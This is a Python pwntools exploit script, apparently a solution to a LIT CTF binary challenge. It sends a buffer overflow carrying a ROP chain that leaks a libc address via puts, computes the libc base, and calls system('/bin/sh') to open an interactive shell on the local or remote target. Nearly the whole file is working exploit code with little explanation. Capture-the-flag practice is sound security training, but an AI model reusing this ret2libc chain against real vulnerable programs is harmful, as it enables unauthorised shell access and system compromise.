#!/usr/bin/env python3
from pwn import *

e = ELF("main")
libc = ELF("hypothesis.so")

context.binary = e

def conn():
	if args.REMOTE:
		return remote("litctf.org", 31774)
	elif args.GDB:
		return gdb.debug(e.path, "b *(main+144)\nc")
	else:
		return process(e.path)

if __name__ == '__main__':
	r = conn()
	rop = ROP(e)

	# set to "gets" or "puts" or "fputs" for multiple leaks
	# fgets actually yields bad results because its address ends in 00 (null byte)
	symbol = 'fputs'
	
	rop.puts(e.got[symbol])
	rop.call(e.sym['main'] + 5)
	
	r.sendlineafter(b'puts\n', b'a'*256 + b'o'*8 + rop.chain())
	r.sendlineafter(b'fputs\n', b'ilovegets')
	r.recvline()

	
	leak = r.recvline(keepends=False) + b'\0'*2
	print(leak)
	leak = u64(leak)
	log.success(f"{symbol} address @ {hex(leak)}")
	
	libc.address = leak - libc.sym[symbol]
	
	log.success(f"LIBC adddress @ {hex(libc.address)}")
	assert libc.address & 0xfff == 0
	
	# with the leaks, we can get the correct LIBC with libc.rip. On remote, the libc seems to be libc-2.35.so
	
	rop = ROP(e)
	
	rop.call(libc.sym['system'], [next(libc.search(b'/bin/sh\0'))])
	
	r.sendlineafter(b'puts\n', b'a'*256 + b'o'*8 + rop.chain())
	r.sendlineafter(b'fputs\n', b'ilovegets')
	
	r.recv()
	
	r.interactive()
